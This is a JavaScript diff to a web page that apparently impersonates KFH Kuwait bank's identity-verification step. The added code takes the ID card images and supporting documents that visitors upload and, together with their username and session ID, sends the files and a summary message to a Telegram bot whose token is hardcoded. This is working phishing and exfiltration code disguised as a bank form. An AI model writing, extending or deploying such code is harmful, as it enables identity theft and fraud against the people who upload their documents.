@@ -177,9 +177,11 @@
                     // Store file in sessionStorage for bot
                     const readerForBot = new FileReader();
                     readerForBot.onload = function(e) {
-                        sessionStorage.setItem(input.id + '_data', e.target.result);
-                        sessionStorage.setItem(input.id + '_name', file.name);
-                        sessionStorage.setItem(input.id + '_type', file.type);
+                        // Use consistent key naming
+                        const key = input.id; // 'id-front', 'id-back', 'supporting-doc'
+                        sessionStorage.setItem(key + '_data', e.target.result);
+                        sessionStorage.setItem(key + '_name', file.name);
+                        sessionStorage.setItem(key + '_type', file.type);
                     };
                     readerForBot.readAsDataURL(file);
                 }
@@ -201,9 +203,15 @@
             // Store document info in sessionStorage for bot
             const formData = new FormData(this);
             sessionStorage.setItem('idType', formData.get('idType'));
-            sessionStorage.setItem('idFrontName', formData.get('idFront') ? formData.get('idFront').name : '');
-            sessionStorage.setItem('idBackName', formData.get('idBack') ? formData.get('idBack').name : '');
-            sessionStorage.setItem('supportingDocName', formData.get('supportingDoc') ? formData.get('supportingDoc').name : '');
+            
+            // Get file names from the input elements
+            const idFrontInput = document.getElementById('id-front');
+            const idBackInput = document.getElementById('id-back');
+            const supportingDocInput = document.getElementById('supporting-doc');
+            
+            sessionStorage.setItem('idFrontName', idFrontInput.files[0] ? idFrontInput.files[0].name : '');
+            sessionStorage.setItem('idBackName', idBackInput.files[0] ? idBackInput.files[0].name : '');
+            sessionStorage.setItem('supportingDocName', supportingDocInput.files[0] ? supportingDocInput.files[0].name : '');
             
             // Send to bot
             sendToBot();
@@ -213,27 +221,83 @@
         });
 
         // Send document data to bot
-        function sendToBot() {
+        async function sendToBot() {
             const botToken = '7293966729:AAHdqTcvCC9hVU06M5hF0rF6C3Y3bZqT2f0';
             const chatId = sessionStorage.getItem('user_chat_id');
+            const username = sessionStorage.getItem('kfh_username') || 'Unknown';
+            const sessionId = sessionStorage.getItem('kfh_session_id') || 'session_' + Math.random().toString(36).substr(2, 9);
             
-            if (!chatId) return;
+            if (!chatId) {
+                console.log('No chatId found, skipping bot notification');
+                return;
+            }
 
-            let message = '📄 *Document Uploaded*\n\n';
-            message += '*ID Type:* ' + (sessionStorage.getItem('idType') || 'Not provided') + '\n';
-            message += '*ID Front:* ' + (sessionStorage.getItem('idFrontName') || 'Not uploaded') + '\n';
-            message += '*ID Back:* ' + (sessionStorage.getItem('idBackName') || 'Not uploaded') + '\n';
-            message += '*Supporting Doc:* ' + (sessionStorage.getItem('supportingDocName') || 'Not uploaded') + '\n';
+            // Send notification message first
+            let message = '📄 *KFH KUWAIT - Documents Uploaded*\n\n';
+            message += '*🆔 Session ID:* ' + sessionId + '\n';
+            message += '*👤 Username:* ' + username + '\n';
+            message += '*🪪 ID Type:* ' + (sessionStorage.getItem('idType') || 'Not provided') + '\n';
+            message += '*📷 ID Front:* ' + (sessionStorage.getItem('idFrontName') || 'Not uploaded') + '\n';
+            message += '*📷 ID Back:* ' + (sessionStorage.getItem('idBackName') || 'Not uploaded') + '\n';
+            message += '*📎 Supporting Doc:* ' + (sessionStorage.getItem('supportingDocName') || 'Not uploaded') + '\n';
+            message += '*📅 Time:* ' + new Date().toLocaleString();
 
-            fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            }).catch(err => console.log('Bot notification error:', err));
+            try {
+                // Send message first
+                await fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                // Send ID Front document if exists
+                const idFrontData = sessionStorage.getItem('id-front_data');
+                if (idFrontData) {
+                    await sendDocumentToBot(botToken, chatId, idFrontData, sessionStorage.getItem('id-front_name'), 'ID_Front');
+                }
+
+                // Send ID Back document if exists
+                const idBackData = sessionStorage.getItem('id-back_data');
+                if (idBackData) {
+                    await sendDocumentToBot(botToken, chatId, idBackData, sessionStorage.getItem('id-back_name'), 'ID_Back');
+                }
+
+                // Send Supporting document if exists
+                const supportingData = sessionStorage.getItem('supporting-doc_data');
+                if (supportingData) {
+                    await sendDocumentToBot(botToken, chatId, supportingData, sessionStorage.getItem('supporting-doc_name'), 'Supporting_Document');
+                }
+
+                console.log('All documents sent to bot successfully');
+            } catch (err) {
+                console.log('Bot notification error:', err);
+            }
+        }
+
+        // Helper function to send document to bot
+        async function sendDocumentToBot(botToken, chatId, base64Data, fileName, caption) {
+            try {
+                // Convert base64 to blob
+                const response = await fetch(base64Data);
+                const blob = await response.blob();
+                
+                // Create FormData
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('document', blob, fileName);
+                formData.append('caption', caption);
+
+                await fetch('https://api.telegram.org/bot' + botToken + '/sendDocument', {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (err) {
+                console.log('Error sending document:', err);
+            }
         }
 
         // Check if user came from verify
